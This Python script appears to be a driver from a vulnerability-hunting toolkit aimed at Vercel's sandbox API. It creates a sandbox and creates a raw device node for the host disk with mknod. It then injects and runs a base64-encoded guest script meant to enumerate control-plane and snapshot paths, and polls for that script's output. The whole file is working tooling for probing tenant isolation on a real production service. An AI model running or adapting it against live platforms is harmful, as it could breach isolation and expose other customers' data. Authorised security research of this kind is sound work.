# -*- coding: utf-8 -*-
"""驱动: 跑 vda4_cell_enum (V4Q) — 控制面路径枚举"""
import base64, os, sys, time, json
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TEAM, PROJ

NAME = 'v6s1'
GUEST = 'vda6_snapshot_s3_guest.py'
HERE = r'F:\scan\skills\non-traditional-vuln-hunting'
OUTF = 'v6s.out'
MARK = 'V6S_DONE'

def mk():
    api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
    time.sleep(3)
    for attempt in range(8):
        c, r = api("POST", "/v4/sandboxes?teamId=%s" % TEAM,
                   {"projectId": PROJ, "name": NAME}, 60)
        if c == 429:
            print('[create] 429 retry %d' % (attempt + 1), flush=True)
            time.sleep(20)
            continue
        break
    print('[create] -> %s' % c, flush=True)
    if c != 200:
        sys.exit(1)
    d = json.loads(r)
    return d['sandbox']['currentSessionId']

if __name__ == '__main__':
    sid = mk()
    print('sid =', sid, flush=True)
    time.sleep(5)
    c, r = cmd(sid, 'sh', ['-c', 'mknod /dev/vda b 254 0 2>/dev/null; ls -la /dev/vda'], timeout_ms=15000)
    print('mknod:', c, (r or '')[:200], flush=True)
    c, r = cmd(sid, 'sh', ['-c', 'mkdir -p /vercel/sandbox'], timeout_ms=15000)
    print('mkdir:', c, flush=True)
    code = open(os.path.join(HERE, GUEST), 'rb').read()
    payload = base64.b64encode(code).decode()
    inject = "import base64;open('/vercel/sandbox/%s','wb').write(base64.b64decode('%s'))" % (GUEST, payload)
    c, r = cmd(sid, 'python3', ['-c', inject], timeout_ms=30000)
    print('inject:', c, flush=True)
    time.sleep(1)
    c, r = cmd(sid, 'sh', ['-c', 'ls -la /vercel/sandbox/'], timeout_ms=15000)
    print('verify:', c, (r or '')[:200], flush=True)
    if GUEST not in (r or ''):
        print('INJECT FAIL - abort', flush=True)
        sys.exit(2)
    c, r = cmd(sid, 'sh', ['-c', 'nohup python3 /vercel/sandbox/' + GUEST + ' > /tmp/v6s_stdout.txt 2>&1 &'], timeout_ms=15000)
    print('kick:', c, (r or '')[:150], flush=True)
    for attempt in range(40):
        time.sleep(5)
        c, r = cmd(sid, 'cat', ['/vercel/sandbox/' + OUTF], timeout_ms=30000)
        if c == 200 and MARK in r:
            fn = os.path.join(r'F:\scan\skills\out', '%s_%s.txt' % (GUEST.replace('.py', ''), time.strftime('%Y%m%d_%H%M%S')))
            open(fn, 'w', encoding='utf-8').write(r)
            print('saved ->', fn, flush=True)
            print(r[-3000:], flush=True)
            break
        tail = (r or '').replace('\\n', ' ')[-250:]
        print('wait r%d status=%d | %s' % (attempt, c, tail), flush=True)
        if attempt in (1, 5, 12) and c != 200:
            c2, r2 = cmd(sid, 'sh', ['-c', 'ls -la /vercel/sandbox/; tail -5 /tmp/v6s_stdout.txt 2>/dev/null'], timeout_ms=20000)
            print('diag:', c2, (r2 or '').replace('\\n', ' ')[-400:], flush=True)
    api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
    print('CLEANED', flush=True)
